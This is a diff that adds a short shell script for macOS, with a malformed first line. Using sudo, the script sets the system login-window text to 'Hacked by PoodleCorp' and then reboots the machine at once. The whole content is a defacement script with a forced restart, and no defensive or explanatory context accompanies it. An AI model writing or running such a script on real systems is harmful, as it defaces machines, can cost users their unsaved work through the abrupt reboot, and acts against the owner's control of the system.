@@ -1,0 +1,4 @@
+#/bin/sh
+
+sudo defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText "Hacked by PoodleCorp"
+sudo shutdown -r now
